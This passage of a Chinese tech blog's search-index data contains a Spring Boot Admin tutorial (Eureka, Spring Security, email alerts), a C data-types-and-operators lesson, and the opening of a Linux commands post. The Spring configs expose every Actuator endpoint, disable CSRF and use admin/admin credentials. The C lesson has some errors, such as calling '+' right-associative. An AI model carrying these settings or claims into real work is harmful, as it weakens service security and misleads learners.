&lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt; 添加 Admin Server 需要的 application.yml 配置文件到工程中： 123456server: port: 9001spring: application: name: admin-server 创建 Admin Server 的主启动类，引入 @EnableAdminServer 注解： 12345678@EnableAdminServer@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 2.4、创建 Admin Client 工程创建 Admin Client 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Client 需要的 application.yml 配置文件到工程中，其中 spring.boot.admin.client.url 是 Admin Server 的地址，目的是将 Admin Client 注册到 Admin Server 中，最后暴露 Admin Client 的 Actuator 的所有端口： 123456789101112131415161718192021server: port: 9002spring: application: name: admin-client boot: admin: client: url: http://127.0.0.1:9001 #Spring Boot Admin Server 的地址 instance: prefer-ip: true #将IP注册到Admin Server上，若不配置默认使用机器的主机名management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 创建 Admin Client 的主启动类： 1234567@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 2.5、测试结果 1）依次启动 admin-server、admin-client 应用程序 2）浏览器访问 http://127.0.0.1:9001/，打开 Admin Server 的主界面，如下图所示： 3）点击实例信息链接跳转到详细页面，可以查看实例的详细监控信息，如图所示 3、Admin 在线查看日志文件Spring Boot Admin 提供了基于 Web 页面的方式实时查看业务服务输出的本地日志（如下图），前提是业务服务中配置了 logging.file，即在被监控的业务模块的 application.yml 配置文件中增加下面的内容： 12logging: file: /tmp/admin/client.log 3.1、源码分析其核心在 LogFileWebEndpointAutoConfiguration 自动配置类上，所以 logging.file.name、logging.file.path、management.endpoint.logfile.external-file 都可以作为开启条件。使用 logging.file.path 配置需要注意，因为默认会读取 spring.log 作为日志文件，而 logging.file.name 则不会。 123456789101112131415161718192021222324252627282930313233343536373839404142434445@Configuration( proxyBeanMethods = false)@ConditionalOnAvailableEndpoint( endpoint = LogFileWebEndpoint.class)@EnableConfigurationProperties({LogFileWebEndpointProperties.class})public class LogFileWebEndpointAutoConfiguration { public LogFileWebEndpointAutoConfiguration() { } @Bean @ConditionalOnMissingBean @Conditional({LogFileWebEndpointAutoConfiguration.LogFileCondition.class}) public LogFileWebEndpoint logFileWebEndpoint(ObjectProvider&lt;LogFile&gt; logFile, LogFileWebEndpointProperties properties) { return new LogFileWebEndpoint((LogFile)logFile.getIfAvailable(), properties.getExternalFile()); } private static class LogFileCondition extends SpringBootCondition { private LogFileCondition() { } public ConditionOutcome getMatchOutcome(ConditionContext context, AnnotatedTypeMetadata metadata) { Environment environment = context.getEnvironment(); String config = this.getLogFileConfig(environment, "logging.file.name", "logging.file"); Builder message = ConditionMessage.forCondition("Log File", new Object[0]); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.name").items(new Object[]{config})); } else { config = this.getLogFileConfig(environment, "logging.file.path", "logging.path"); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.path").items(new Object[]{config})); } else { config = environment.getProperty("management.endpoint.logfile.external-file"); return StringUtils.hasText(config) ? ConditionOutcome.match(message.found("management.endpoint.logfile.external-file").items(new Object[]{config})) : ConditionOutcome.noMatch(message.didNotFind("logging file").atAll()); } } } private String getLogFileConfig(Environment environment, String configName, String deprecatedConfigName) { String config = environment.resolvePlaceholders("${" + configName + ":}"); return StringUtils.hasText(config) ? config : environment.resolvePlaceholders("${" + deprecatedConfigName + ":}"); } }} 另外可以看到 LogFileWebEndpointProperties 这个类，所以 management.endpoint.logfile.externalFile 也是可以作为开启条件 实际上 Spring 在解析 Properties 时会在 Spring 缓存的 Map 中，把 management.endpoint.logfile.external-file 的 Key 转换成 management.endpoint.logfile.externalFile 4、Admin 整合 Eureka 注册中心在上述的快速入门案例里，是直接将 Admin Client 注册到了 Admin Server 中，而企业开发中更多的是将服务注册到注册中心（Eureka、Consul），以下的案例将演示如何整合 Admin 和 Eureka，点击下载完整的案例代码。 4.1、版本说明在本文中，使用的 Spring Cloud 版本是 Hoxton.SR1，对应的 Spring Boot 版本是 2.2.2.RELEASE，特别声明除外，点击下载完整的案例代码。 4.2、创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4.3、创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程： 1234567891011server: port: 9003eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4.4、创建 Admin Server 工程创建 Admin Server 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Server 需要的 application.yml 配置文件到工程中，将 Admin Server 注册到 Eureka 注册中心，并暴露 Admin Server 的 Actuator 的所有端口： 1234567891011121314151617181920212223242526server: port: 9001spring: application: name: admin-servereureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 创建 Admin Server 的主启动类，添加 @EnableAdminServer 注解开启监控功能，添加 @EnableDiscoveryClient 注解让 Admin Server 可以发现注册到 Eureka 里的其他服务实例： 123456789@EnableAdminServer@EnableDiscoveryClient@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 4.5、创建 Admin Client 工程创建 Admin Client 的 Maven 工程，配置工程里的 pom.xml 文件： 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Client 需要的 application.yml 配置文件到工程中，将 Admin Client 注册到 Eureka 注册中心，而不是使用上述快速入门案例里的 spring.boot.admin.client.url 将 Admin Client 注册到 Admin Server 中，最后暴露 Admin Client 的 Actuator 的所有端口： 1234567891011121314151617181920212223242526server: port: 9002spring: application: name: admin-clienteureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 创建 Admin Client 的主启动类，引入 @EnableDiscoveryClient 注解： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 4.6、测试结果 1）依次启动 eureka-server、admin-server、admin-client 应用程序 2）浏览器访问 http://127.0.0.1:9001/，打开 Admin Server 的 Web 界面，可以看到有两个服务（如下图所示）： 3）点击实例信息链接跳转到详细页面，可以查看实例的详细监控信息，这里不再累述 5、Admin 整合 Spring Security生产环境中由于考虑到安全问题，一般不允许直接访问 Admin Server 的 Web 界面，建议整合 Admin + Spring Security，为 Admin Server 新增登录界面，点击下载完整的案例代码。 在 Admin Server 工程的 pom.xml 配置文件中引入以下的依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 在 Admin Server 工程的 application.yml 中配置 Spring Security 的用户名和密码，同时在服务注册时带上 metadata-map 的信息： 123456789101112131415161718192021222324252627282930313233server: port: 9001spring: application: name: admin-server security: user: name: "admin" password: "admin"eureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 metadata-map: #指定Spring Security的用户名和密码 user.name: ${spring.security.user.name} user.password: ${spring.security.user.password}management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 在 Admin Server 工程中创建 Spring Security 的配置类： 12345678910111213141516171819202122232425@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { private final String adminContextPath; public SecurityConfiguration(AdminServerProperties adminServerProperties) { this.adminContextPath = adminServerProperties.getContextPath(); } @Override protected void configure(HttpSecurity http) throws Exception { SavedRequestAwareAuthenticationSuccessHandler successHandler = new SavedRequestAwareAuthenticationSuccessHandler(); successHandler.setTargetUrlParameter("redirectTo"); http.authorizeRequests() .antMatchers(adminContextPath + "/assets/**").permitAll() .antMatchers(adminContextPath + "/login").permitAll() .anyRequest().authenticated() .and() .formLogin().loginPage(adminContextPath + "/login").successHandler(successHandler).and() .logout().logoutUrl(adminContextPath + "/logout").and() .httpBasic().and() .csrf().disable(); }} 重启 Admin Server 服务，在浏览器上访问 http://127.0.0.1:9001/ 后，页面会被重定向到登录界面，登录的用户名和密码分别为上面配置的 admin 和 admin，界面显示如下： 6、Admin 整合邮箱报警Spring Boot Admin 中可以集成邮箱报警功能，比如服务不健康了、下线了，都可以给指定邮箱发送邮件。集成的步骤非常简单，首先在 Admin Server 中引入以下依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 在 Admin Server 的 application.yml 配置文件中，添加邮件相关的配置内容，其中 username 与 notify.mail.from 的内容必须一致： 123456789101112spring: mail: port: 25 host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com 由于国内腾讯云、阿里云默认封了 25 端口，若项目是部署在云服务器，使用上述的配置是无法正常发送邮件的，需要更改为使用 465 端口，并启用 SSL 邮件加密，最后系统防火墙别忘了开放 465 端口，配置示例如下： 12345678910111213141516171819202122232425spring: mail: port: 465 protocol: smtp host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx properties: mail: smtp: auth: true socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory ssl: enable: true starttls: enable: true required: true boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com 以上配置，当已注册的服务的状态从 UP 变为 OFFLINE 或其他状态时，Admin Server 会自动将告警邮件发送到对应的邮箱，更多邮箱相关的配置示例如下： 123456789101112131415161718192021222324252627spring.mail.host=smtp.qq.comspring.mail.username=xx@qq.comspring.mail.password=xxxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socket.factory.class=javax.net.ssl.SSLSocketFactoryspring.mail.properties.mail.smtp.socket.factory.fallback=falsespring.mail.properties.mail.smtp.port=465spring.mail.properties.mail.transport.protocol=smtp#需要忽略的状态改变通知，逗号分隔,例如不通知离线到上线的状态，则填写为OFFLINE:UP#spring.boot.admin.notify.mail.ignore-changes=#接收通知的邮箱地址，逗号分隔spring.boot.admin.notify.mail.to=yangzhilong@qq.com#需要抄送的邮箱地址，逗号分隔#spring.boot.admin.notify.mail.cc=test1@qq.com#邮件发送者,大部分情况与登录名相同spring.boot.admin.notify.mail.from=${spring.mail.username}#邮件主题，默认是：#{application.name} (#{application.id}) is #{to.status}spring.boot.admin.notify.mail.subject=${spring.profiles.active} profile\'s #{application.name} (#{application.id}) is #{to.status}#邮件内容，默认是：#{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}\\n\\n#{application.healthUrl}spring.boot.admin.notify.mail.text=${spring.profiles.active} profile\'s #{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}#Comma-delimited list of status changes to be ignored. Format: "&lt;from-status&gt;:&lt;to-status&gt;". Wildcards allowed.默认值："UNKNOWN:UP"#spring.boot.admin.notify.mail.ignore-changes= 7、参考资料 Spring Boot 使用 QQ 邮箱发邮件 Spring Boot Admin 在线日志配置 Spring Boot Admin 2.1.0 全攻略 SpringBoot（2.1.1）监控管理及性能调优 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"C 语言语法之一数据类型与运算符",url:"/posts/168c8788.html",text:'数据类型数据类型概览 常量与变量对于基本数据类型量，按其取值是否可改变又分为常量和变量两种。在程序执行过程中，其值不发生改变的量称为常量，其值可变的量称为变量。它们可与数据类型结合起来分类，例如可分为整型常量、整型变量、浮点常量、浮点变量、字符常量、字符变量、枚举常量、枚举变量。在程序中，常量是可以不经说明而直接引用的，而变量则必须先定义后使用。（整型量包括整型常量、整型变量） 符号常量在 C 语言中，可以用一个标识符来表示一个常量，称之为符号常量。符号常量在使用之前必须先定义，其一般定义形式为：#define 标识符 常量。其中 #define 也是一条预处理命令（预处理命令都以”#” 开头），称为宏定义命令，其功能是把该标识符定义为其后的常量值。一经定义，以后在程序中所有出现该标识符的地方均代之以该常量值。习惯上符号常量的标识符用大写字母，变量标识符用小写字母，以示区别。 整型常量的表示方法整型常量就是整常数，在 C 语言中，使用的整常数有十进制、八进制和十六进制三种： 十进制整常数：十进制整常数没有前缀，其数码为 0～9，以下各数是合法的十进制整常数：237、-568、65535、1627 八进制整常数：八进制整常数必须以 0 开头，即以 0 作为八进制数的前缀，数码取值为 0～7，八进制数通常是无符号数。 以下各数是合法的八进制数： 015 (十进制为 13)、0101 (十进制为 65)、0177777 (十进制为 65535) 十六进制整常数：十六进制整常数的前缀为 0X 或 0x，其数码取值为 09，AF 或 a~f。 以下各数是合法的十六进制整常数： 0X2A (十进制为 42)、0XA0 (十进制为 160)、0XFFFF (十进制为 65535) 整型常数的后缀：在 16 位字长的机器上，基本整型的长度也为 16 位，因此表示的数的范围也是有限定的。十进制无符号整常数的范围为 0～65535，有符号数为 - 32768～+32767。八进制无符号数的表示范围为 0～0177777。十六进制无符号数的表示范围为 0X0～0XFFFF 或 0x0～0xFFFF。如果使用的数超过了上述范围，就必须用长整型数来表示，长整型数是用后缀 “L” 或 “l” 来表示的。 整型变量的分类注意：整型变量占多少个字节，这个跟系统和编译器的规定有关！ 基本型：类型说明符为 int，在内存中占 4 个字节 短整型：类型说明符为 short int 或 short，在内存中占 2 个字节 长整型：类型说明符为 long int 或 long，在内存中占 8 个字节 无符号型：类型说明符为 unsigned，在内存中占 4 个字节 整型变量在内存中的存放形式内存中的整型变量以二进制存储，一个字节 (byte) = 8 位 (bit)。其中数值是以补码表示，正数的补码和原码相同，负数的补码则是将该数的绝对值的二进制形式按位取反再加一。 1234567例如：求-10的补码10的原码： 00001010取反： 11110101再加1，得-10的补码： 11110110提示：第一位是符号位！ 实型常量的表示方法实型也称为浮点型，实型常量也称为实数或者浮点数。在 C 语言中，浮点数只采用十进制表示，其中有二种形式：十进制小数形式、指数形式。标准 C 语言允许浮点数使用后缀，后缀为 “f” 或 “F” 即表示该数为浮点数，如 356f 和 356. 是等价的。 十进制数形式：由数码 0~ 9 和小数点组成，例如 0.0、25.0、5.789、0.13、5.0、300.、-267.8230 等均为合法的实数 (必须有小数点) 指数形式：由十进制数、阶码标志 “e” 或 “E”、阶码 (只能为整数，可以带符号) 组成，其一般形式为：a E n（a 为十进制数，n 为十进制整数），例如 2.1E5 (等于 2.1105)、-2.8E-2 (等于 - 2.810-2)、0.5E7 (等于 0.5*107) 实型变量的分类实型变量分为：单精度（float 型）、双精度（double 型）和长双精度（long double 型）三类。在 Turbo C 中单精度型占 4 个字节（32 位）内存空间，其数值范围为 3.4E-38～3.4E+38，只能提供七位有效数字。双精度型占 8 个字节（64 位）内存空间，其数值范围为 1.7E-308～1.7E+308，可提供 16 位有效数字。 实型变量在内存中的存放形式实型变量一般占 4 个字节 (32 位) 的内存空间，按指数形式存储，实数 3.14159 在内存中的存放形式如下： 小数部分占的位 (bit) 数愈多，数的有效数字愈多，精度愈高 指数部分占的位数愈多，则能表示的数值范围愈大 字符常量字符常量是用单引号括起来的一个字符，例如：’a’、’b’、’=’、’+’、’?’都是合法字符常量。在 C 语言中，字符常量有以下特点： 字符常量只能用单引号括起来，不能用双引号或其它括号 字符常量只能是单个字符，不能是字符串 字符可以是字符集中任意字符，但数字被定义为字符型之后就不能参与数值运算。例如’5’和 5 是不同的，’5’是字符常量，不能参与运算 转义字符转义字符是一种特殊的字符常量，转义字符以反斜线”" 开头，后面跟一个或几个字符。转义字符具有特定的含义，不同于字符原有的意义，故称 “转义” 字符。例如 printf 函数的格式串中用到的 \\n 就是一个转义字符，其意义是 “回车换行”。转义字符主要用来表示那些用一般字符不便于表示的控制代码。 字符变量字符变量用来存储字符常量，即单个字符。字符变量的类型说明符是 char，字符变量类型定义的格式和书写规则都与整型变量相同。例如：char a, b; 字符变量在内存中的存放形式每个字符变量被会被分配一个字节的内存空间，因此只能存放一个字符。字符值是以 ASCII 码的形式存放在变量的内存单元之中的，如 x 的十进制 ASCII 码是 120，y 的十进制 ASCII 码是 121。若对字符变量 a、b 分别赋予’x’和’y’值：a =‘x’; b = \'y\';，实际上是在 a、b 两个单元内存放 120 和 121 的二进制值。 字符串常量字符串常量是由一对双引号括起的字符序列，例如：”CHINA”、”C program” 等都是合法的字符串常量。字符串常量和字符常量是不同的量，它们之间主要有以下区别： 字符常量由单引号括起来，字符串常量由双引号括起来 字符常量只能是单个字符，字符串常量则可以含一个或多个字符 可以把一个字符常量赋予一个字符变量，但不能把一个字符串常量赋予一个字符变量，例如：可以是 char a = ‘a’ 但不能是 char a = “a” 字符常量占一个字节的内存空间，字符串常量占的内存字节数等于字符串的字节数加一，额外增加的一个字节用于存放字符 \\0 (ASCII 码为 0)，这是字符串的结束标志 运算符各类数值型数据之间的混合运算变量的数据类型是可以转换的，转换的方法有两种，一种是自动转换，一种是强制转换。自动转换发生在不同数据类型的量混合运算时，由编译系统自动完成。自动转换遵循以下规则： 若参与运算量的类型不同，则先转换成同一类型，然后进行运算 转换按数据长度增加的方向进行，以保证精度不降低，如 int 型和 long 型运算时，先把 int 量转成 long 型后再进行运算 所有的浮点运算都是以双精度进行的，即使仅含 float 单精度量运算的表达式，也要先转换成 double 型，再作运算 char 型和 short 型参与运算时，必须先转换成 int 型 在赋值运算中，赋值号两边量的数据类型不同时，赋值号右边量的类型将转换为左边量的类型。如果右边量的数据类型长度比左边长时，将丢失一部分数据，这样会降低精度，丢失的部分按四舍五入向前舍入，类型自动转换的规则为：double &lt;- long &lt;- unsigned &lt;- int &lt;- char、short 自动类型转换如果赋值运算符两边的数据类型不相同，系统将自动进行类型转换，即把赋值号右边的类型换成左边的类型，具体规定如下： 实型赋予整型，舍去小数部分 整型赋予实型，数值不变，但将以浮点形式存放，即增加小数部分 (小数部分的值为 0) 字符型赋予整型，由于字符型为一个字节，而整型为四个字节，故将字符的 ASCII 码值放到整型量的低八位中，高八位为 0。整型赋予字符型，只把低八位赋予字符量 强制类型转换强制类型转换是通过类型转换运算来实现的，其一般形式为：(类型说明符) (表达式)，其功能是把表达式的运算结果强制转换成类型说明符所表示的类型。例如： (float) a 表示把 a 转换为浮点型，(int)(x+y) 表示把 x+y 的结果转换为整型，在使用强制转换时应注意以下问题： 类型说明符和表达式都必须加括号 (单个变量可以不加括号)，如把 (int)(x+y) 写成 (int)x+y 则成了把 x 转换成 int 型之后再与 y 相加了 无论是强制转换或是自动转换，都只是为了本次运算的需要而对变量的数据长度进行的临时性转换，而不改变数据说明时对该变量定义的类型 基本的算术运算符 加法运算符 “+”：加法运算符为双目运算符，即应有两个量参与加法运算。如 a+b, 4+8 等，具有右结合性 减法运算符 “-”：减法运算符为双目运算符，但 “-” 也可作负值运算符，此时为单目运算，如 - x, -5 等，具有左结合性 乘法运算符 “*”：双目运算，具有左结合性 除法运算符 “/”：双目运算，具有左结合性，参与运算量均为整型时，结果也为整型，舍去小数部分；如果运算量中有一个是实型，则结果为双精度实型 运算符的优先级与结合性 运算符的优先级：C 语言中，运算符的运算优先级共分为 15 级。1 级最高，15 级最低。在表达式中，优先级较高的先于优先级较低的进行运算。而在一个运算量两侧的运算符优先级相同时，则按运算符的结合性所规定的结合方向处理 运算符的结合性：C 语言中各运算符的结合性分为两种，即左结合性 (自左至右) 和右结合性 (自右至左)。例如算术运算符的结合性是自左至右，即先左后右。如有表达式 x-y+z 则 y 应先与 “-” 号结合，执行 x-y 运算，然后再执行 + z 的运算，这种自左至右的结合方向就称为 “左结合性”。而自右至左的结合方向称为 “右结合性”。 最典型的右结合性运算符是赋值运算符，如 x=y=z，由于 “=” 的右结合性，应先执行 y=z 再执行 x=(y=z) 运算。C 语言运算符中有不少为右结合性，应注意区别，以避免理解错误 运算符优先级与结合性一览表点击查看运算符优先级与结合性一览表，表中可以总结出如下规律： 结合方向只有三个是从右往左，其余都是从左往右 所有双目运算符中只有赋值运算符的结合方向是从右往左 另外两个从右往左结合的运算符也很好记，因为它们很特殊：一个是单目运算符，一个是三目运算符 C 语言中有且只有一个三目运算符 逗号运算符的优先级最低，要记住 对于优先级：算术运算符 &gt; 关系运算符 &gt; 逻辑运算符 &gt; 赋值运算符，逻辑运算符中 “!” 除外 自增、自减运算符 自增 1 运算符：记为 ++，其功能是使变量的值自增 1 自减 1 运算符：记为 --，其功能是使变量值自减 1 自增 1，自减 1 运算符均为单目运算，都具有右结合性，可有以下几种形式：++i，i 自增 1 后再参与其它运算--i，i 自减 1 后再参与其它运算i++，i 参与运算后，i 的值再自增 1i--，i 参与运算后，i 的值再自减 1 1234567int i = 8;printf("%d\\n",++i); // 打印9，此时i=9printf("%d\\n",--i); // 打印8，此时i=8printf("%d\\n",i++); // 打印8，此时i=9printf("%d\\n",i--); // 打印9，此时i=8printf("%d\\n",-i++); // 打印-8，此时i=9printf("%d\\n",-i--); // 打印-9，此时i=8 赋值运算符和赋值表达式 赋值运算符记为 “=”，由 “=” 连接的式子称为赋值表达式，其一般表现形式为： 变量 = 表达式，例如 x = a + b 赋值表达式的功能是计算表达式的值再赋予左边的变量，因此赋值运算符具有右结合性，例如 a=b=c=5 可理解为 a=(b=(c=5)) 复合的赋值运算符 在赋值符 “=” 之前加上其它二目运算符可构成复合赋值符，例如 +=、-=、*=、/=、%=、&lt;&lt;=、&gt;&gt;=、&amp;=、^=、|= 复合赋值符这种写法，十分有利于编译处理，能提高编译效率并产生质量较高的目标代码，例如 a+=5 等价于 a=a+5，r%=p 等价于 r=r%p 本节重点内容 整型变量在内存中的存放形式 实型变量在内存中的存放形式 字符变量在内存中的存放形式 各类数值型数据之间的混合运算 自动类型转换 运算符的优先级与结合性 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"Linux 运维知识图谱 (最新)",url:"/posts/56039a80.html",text:'Linux 运维技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"Linux 必要命令摘要",url:"/posts/817c7d82.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"在线电子书"},{title:"Linux 系统编程之三 - 系统常用命令",url:"/posts/2db9f8a1.html",text:'命令格式Linux 命令的格式：command [-options] [parameter1] ... command：命令名称，相应功能的英文单词或单词的缩写 [-options]：选项，可用来对命令进行控制，也可以省略，[] 代表可选 parameter1 ...：命令的参数，可以是零个、一个或者多个 基础命令管道 |管道，也就是一个命令的输出可以通过管道做为另一个命令的输入。简单概括，管道可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里 | 的左右分为两端，左端塞东西（写），右端取东西（读）。 1$ ls -alh | more 清屏 clearclear 作用为清除终端上的显示（类似于 DOS 的 cls 清屏功能），也可使用快捷键：ctrl + l。 1$ clear 输出重定向 &gt;Linux 允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。&gt; 输出重定向会覆盖原来的内容，&gt;&gt; 输出重定向则会将内容追加到文件的尾部。 12345# 覆盖文件内容$ ls &gt; abc.txt# 追加文件内容$ date &gt;&gt; abc.txt 切换工作目录 cd在使用 Unix/Linux 的时候，经常需要更换工作目录，cd 